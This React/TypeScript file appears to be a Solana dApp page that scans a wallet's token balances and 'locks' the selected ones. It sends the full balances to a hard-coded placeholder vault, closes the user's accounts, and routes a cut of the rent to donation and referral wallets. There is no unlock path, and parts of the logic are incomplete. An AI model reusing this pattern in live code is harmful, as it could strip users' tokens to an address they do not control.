import React, { useState, useEffect } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
  PublicKey,
  VersionedTransaction,
  TransactionMessage,
  SystemProgram,
  LAMPORTS_PER_SOL,
  TransactionInstruction,
} from '@solana/web3.js';
import {
  TOKEN_PROGRAM_ID,
  createCloseAccountInstruction,
  createTransferInstruction,
  getAssociatedTokenAddress,
  getMint,
} from '@solana/spl-token';
import { saveLog } from '../supabaseFunctions';
import SuccessPopup from '../components/SuccessPopup'; // or inline

interface TokenAccount {
  pubkey: string;
  mint: string;
  rentLamports: number;
  uiAmount: number;
  decimals: number;
  selected?: boolean;
}

const DONATION_PERCENTAGE = 5;
const REFERRAL_PERCENTAGE = 5;
const DONATION_WALLET = new PublicKey(
  '9uPrBhLnv2mt4LV28G33tG1AinY16PpX4cy3dr7Q7aBZ'
);

// Replace with your real lock program
const LOCK_PROGRAM_ID = new PublicKey('9xQeWvG816bUx9b8jJFkwPZ947Koj19mw8r6K5zUmRe2');

// Suppose your lock program expects tokens to be sent to a “vault” address or a PDA
// For demonstration we use a hard-coded address. In real usage, derive it from seeds/PDA.
const VAULT_ADDRESS = new PublicKey('9xQeWvG816bUx9b8jJFkwPZ947Koj19mw8r6K5zUmRe2');

function LockPage() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();

  const [tokenAccounts, setTokenAccounts] = useState<TokenAccount[]>([]);
  const [isScanning, setIsScanning] = useState(false);
  const [isLocking, setIsLocking] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // For “Select All” checkbox
  const [allSelected, setAllSelected] = useState(false);

  // For success popup
  const [isPopupVisible, setIsPopupVisible] = useState(false);
  const [popupData, setPopupData] = useState({ accountsLocked: 0, solRecovered: 0 });

  // (Optional) Lock duration or additional data from user
  const [lockDuration, setLockDuration] = useState<number>(3600);

  // 1) SCAN for non‐zero token accounts
  const scanAccounts = async () => {
    if (!publicKey) {
      setError('Wallet not connected');
      return;
    }
    setIsScanning(true);
    setError(null);

    try {
      const resp = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      const nonZeroAccounts: TokenAccount[] = [];
      for (const { pubkey, account } of resp.value) {
        const parsedInfo = account.data.parsed.info;
        const uiAmount = parsedInfo.tokenAmount.uiAmount;
        const decimals = parsedInfo.tokenAmount.decimals;
        const mint = parsedInfo.mint;
        const rentLamports = account.lamports;

        // only keep accounts with > 0 balance
        if (uiAmount && uiAmount > 0) {
          const mintInfo = await getMint(connection, new PublicKey(mint));
          nonZeroAccounts.push({
            pubkey: pubkey.toString(),
            mint,
            rentLamports,
            uiAmount,
            decimals: mintInfo.decimals,
            selected: false,
          });
        }
      }

      if (nonZeroAccounts.length === 0) {
        setError('No token accounts with balance found.');
      }
      setTokenAccounts(nonZeroAccounts);
    } catch (err: any) {
      console.error('Error scanning token accounts:', err);
      setError(err.message || 'Failed to scan accounts.');
    } finally {
      setIsScanning(false);
    }
  };

  // 2) SELECT/DESELECT an account
  const toggleAccountSelection = (pubkey: string) => {
    setTokenAccounts((accounts) =>
      accounts.map((acc) =>
        acc.pubkey === pubkey ? { ...acc, selected: !acc.selected } : acc
      )
    );
  };

  // 2b) SELECT/DESELECT ALL
  const toggleAllAccounts = () => {
    setAllSelected(!allSelected);
    setTokenAccounts((accounts) =>
      accounts.map((acc) => ({ ...acc, selected: !allSelected }))
    );
  };

  // 3) LOCK SELECTED
  // We “lock” by transferring tokens to our program’s vault, optionally sending a “lock” instruction,
  // then close the user’s old token accounts to free up rent.
  const lockSelected = async () => {
    if (!publicKey || isLocking) return;
    const selected = tokenAccounts.filter((acc) => acc.selected);
    if (selected.length === 0) return;

    // Confirm
    const confirmMsg = `Lock tokens in ${selected.length} account(s) for ~${lockDuration} sec?`;
    if (!window.confirm(confirmMsg)) return;

    setIsLocking(true);
    setError(null);

    try {
      let totalRentLamports = 0;
      const batches: any[] = [];
      let currentBatch: any[] = [];

      for (let i = 0; i < selected.length; i++) {
        const account = selected[i];
        totalRentLamports += account.rentLamports;

        // 1) Transfer tokens to the vault address
        // We must use “createTransferInstruction” from the user’s token account => vault’s token account
        // So we need the associated token account for the vault
        const vaultTokenAddress = await getAssociatedTokenAddress(
          new PublicKey(account.mint),
          VAULT_ADDRESS, // this is the “owner” for that ATA
          true
        );
        // The user’s existing token account is account.pubkey

        const transferIx = createTransferInstruction(
          new PublicKey(account.pubkey),
          vaultTokenAddress,
          publicKey,
          Math.floor(account.uiAmount * 10 ** account.decimals)
        );
        currentBatch.push(transferIx);

        // 2) Optionally send a custom “lock instruction” so your program knows how long to lock
        const lockData = Buffer.from(Uint8Array.of(1, ...new TextEncoder().encode(lockDuration.toString())));
        const lockIx = new TransactionInstruction({
          keys: [
            { pubkey: publicKey, isSigner: true, isWritable: true },
            { pubkey: VAULT_ADDRESS, isSigner: false, isWritable: true },
          ],
          programId: LOCK_PROGRAM_ID,
          data: lockData,
        });
        currentBatch.push(lockIx);

        // 3) Close user’s old token account
        const closeIx = createCloseAccountInstruction(
          new PublicKey(account.pubkey),
          publicKey,
          publicKey
        );
        currentBatch.push(closeIx);

        // Batching
        if ((i + 1) % 10 === 0 || i === selected.length - 1) {
          batches.push([...currentBatch]);
          currentBatch = [];
        }
      }

      // Donation logic for the recovered rent
      const donationAmount = Math.floor((totalRentLamports * DONATION_PERCENTAGE) / 100);
      // Check referral
      const params = new URLSearchParams(window.location.search);
      const referrer = params.get('ref');

      let referralAmount = 0;
      let donationAfterReferral = donationAmount;
      if (referrer) {
        referralAmount = Math.floor((donationAmount * REFERRAL_PERCENTAGE) / 100);
        donationAfterReferral = donationAmount - referralAmount;
      }

      // Donation
      if (donationAfterReferral > 0) {
        batches.push([
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: DONATION_WALLET,
            lamports: donationAfterReferral,
          }),
        ]);
      }

      // Referral
      if (referrer && referralAmount > 0) {
        batches.push([
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new PublicKey(referrer),
            lamports: referralAmount,
          }),
        ]);
      }

      // Send each batch
      const signatures: string[] = [];
      for (const instructions of batches) {
        const latestBlockhash = await connection.getLatestBlockhash();
        const messageV0 = new TransactionMessage({
          payerKey: publicKey,
          recentBlockhash: latestBlockhash.blockhash,
          instructions,
        }).compileToV0Message();
        const tx = new VersionedTransaction(messageV0);

        const sig = await sendTransaction(tx, connection);
        signatures.push(sig);

        // optionally confirm
        await connection.confirmTransaction({
          blockhash: latestBlockhash.blockhash,
          lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
          signature: sig,
        });
      }

      const accountsLocked = selected.length;
      const solRecovered = totalRentLamports / LAMPORTS_PER_SOL;

      await saveLog(
        `Locked tokens from ${accountsLocked} accounts for ${lockDuration} seconds. 
         Recovered ${solRecovered.toFixed(4)} SOL in rent.`,
        signatures.join(', '),
        publicKey.toString(),
        solRecovered,
        accountsLocked
      );

      // Refresh
      await scanAccounts();

      // Show success
      setPopupData({ accountsLocked, solRecovered });
      setIsPopupVisible(true);
    } catch (err: any) {
      console.error('Lock error:', err);
      setError(err.message || 'Failed to lock tokens.');
    } finally {
      setIsLocking(false);
    }
  };

  const closePopup = () => setIsPopupVisible(false);

  return (
    <div className="max-w-3xl mx-auto py-8">
      <h1 className="text-3xl font-bold mb-6">Lock Tokens</h1>

      {/* Success Popup */}
      <SuccessPopup
        isVisible={isPopupVisible}
        onClose={closePopup}
        accountsClosed={popupData.accountsLocked}
        solRecovered={popupData.solRecovered}
        actionType="locked"
      />

      <div className="flex space-x-4 mb-6">
        <button
          onClick={scanAccounts}
          disabled={isScanning}
          className="px-4 py-2 bg-purple-600 text-white rounded hover:bg-purple-700 disabled:opacity-50"
        >
          {isScanning ? 'Scanning...' : 'Scan Token Accounts'}
        </button>
        <button
          onClick={lockSelected}
          disabled={
            isLocking || !tokenAccounts.some((acc) => acc.selected)
          }
          className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 disabled:opacity-50"
        >
          {isLocking ? 'Locking...' : 'Lock Selected'}
        </button>
      </div>

      {/* Lock Duration Input */}
      <div className="mb-4">
        <label className="block font-medium mb-1">
          Lock Duration (seconds)
        </label>
        <input
          type="number"
          value={lockDuration}
          onChange={(e) => setLockDuration(Number(e.target.value))}
          className="p-2 border rounded w-40"
          min={1}
        />
      </div>

      {/* Error */}
      {error && (
        <div className="bg-red-100 text-red-800 p-3 rounded mb-4">
          {error}
        </div>
      )}

      {/* Token List */}
      {tokenAccounts.length > 0 && (
        <div className="mb-6">
          <div className="flex items-center mb-2">
            <input
              type="checkbox"
              checked={allSelected}
              onChange={toggleAllAccounts}
              className="h-4 w-4"
            />
            <label className="ml-2 font-medium">
              Select All
            </label>
          </div>
          {tokenAccounts.map((acc) => (
            <div
              key={acc.pubkey}
              className={`border p-3 rounded mb-2 flex items-center justify-between 
                          ${acc.selected ? 'bg-purple-50' : ''}`}
              onClick={() => toggleAccountSelection(acc.pubkey)}
            >
              <div className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  checked={acc.selected}
                  onChange={(e) => e.stopPropagation()}
                  className="h-4 w-4"
                />
                <span className="font-mono text-xs">
                  {acc.pubkey.slice(0, 4)}...{acc.pubkey.slice(-4)}
                </span>
              </div>
              <div className="text-right">
                <p className="text-sm">
                  Bal: {acc.uiAmount.toFixed(acc.decimals)}
                </p>
                <p className="text-xs text-gray-500">
                  Rent: {(acc.rentLamports / LAMPORTS_PER_SOL).toFixed(4)} SOL
                </p>
                <p className="text-xs text-gray-500">
                  Mint: {acc.mint.slice(0, 4)}...{acc.mint.slice(-4)}
                </p>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

export default LockPage;
